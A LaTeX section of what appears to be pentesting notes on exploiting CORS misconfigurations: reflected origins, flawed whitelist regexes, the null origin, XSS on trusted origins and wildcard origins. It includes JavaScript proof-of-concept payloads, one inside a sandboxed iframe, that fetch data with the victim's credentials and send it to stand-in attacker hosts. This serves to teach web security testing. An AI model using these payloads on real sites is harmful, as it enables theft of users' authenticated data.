\section{Exploit misconfig}
\subsection{Reflected Origin}
Some applications need to provide access to a number of other domains.
Maintaining a list of allowed domains requires ongoing effort, and any mistakes
risk breaking functionality. So some applications take the easy route of
effectively allowing access from any other domain.

One way to do this is by reading the Origin header from requests and including
a response header stating that the requesting origin is allowed. 


\subsection{Errors parsing Origin headers}
Some applications that support access from multiple origins do so by using a
whitelist of allowed origins. When a CORS request is received, the supplied
origin is compared to the whitelist. If the origin appears on the whitelist
then it is reflected in the Access-Control-Allow-Origin header so that access
is granted. 
Mistakes often arise when implementing CORS origin whitelists. These rules are
often implemented by matching URL prefixes or suffixes, or using regular
expressions. Any mistakes in the implementation can lead to access being
granted to unintended external domains. 

 For example, suppose an application grants access to all domains ending in:
 \verb+normal-website.com+ An attacker might be able to gain access by
 registering the domain: \verb+hackersnormal-website.com+

 \begin{verbatim}
 var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://api.example.com/endpoint',true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText;
};
\end{verbatim}


In this scenario the server utilizes a regex where the dot was not escaped
correctly. For instance, something like this: \verb+^api.example.com$+ instead
of \verb+^api\.example.com$+. Thus, the dot can be replaced with any letter to
gain access from a third-party domain. For example \verb+apiiexample.com+


For more information and settings of this bypass check:
\href{https://infosecwriteups.com/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397}{Advanced
CORS Exploitation Techniques}



\subsection{null origin value}
 The specification for the \verb+Origin+ header supports the value \verb+null+.
 Browsers might send the value \verb+null+ in the \verb+Origin+ header in various unusual situations:
 \begin{itemize}
     \item   Cross-origin redirects.
     \item   Requests from serialized data.
     \item   Request using the file: protocol.
     \item   Sandboxed cross-origin requests.
 \end{itemize}

Some applications might whitelist the \verb+null+ origin to support local development of the application. For example, suppose an application receives the following cross-origin request:
\begin{verbatim}
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
\end{verbatim}

And the server responds with:
\begin{verbatim}
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
\end{verbatim}

In this situation, an attacker can use various tricks to generate a
cross-origin request containing the value null in the Origin header. This will
satisfy the whitelist, leading to cross-domain access. For example, this can be
done using a sandboxed iframe cross-origin request of the form:

\begin{verbatim}
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
\end{verbatim}


\subsection{XSS on Trusted Origin}

Even "correctly" configured CORS establishes a trust relationship between two
origins. If a website trusts an origin that is vulnerable to cross-site
scripting (XSS), then an attacker could exploit the XSS to inject some
JavaScript that uses CORS to retrieve sensitive information from the site that
trusts the vulnerable application.


Given the following request:
\begin{verbatim}
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
\end{verbatim}

 If the server responds with:

\begin{verbatim}
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
\end{verbatim}

Then an attacker who finds an XSS vulnerability on
subdomain.vulnerable-website.com could use that to retrieve the API key, using
a URL like:
\begin{verbatim}
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
\end{verbatim}


\subsection{Wildcard Origin * without Credentials}
 Most CORS attacks rely on the presence of the response header:
\begin{verbatim}
Access-Control-Allow-Credentials: true
\end{verbatim}

Without that header, the victim user's browser will refuse to send their
cookies, meaning the attacker will only gain access to unauthenticated content,
which they could just as easily access by browsing directly to the target
website.

If the server responds with a wildcard origin *, the browser does never send
the cookies. However, if the server does not require authentication, it's still
possible to access the data on the server. This can happen on internal servers
that are not accessible from the Internet. The attacker's website can then
pivot into the internal network and access the server's data without
authentication.


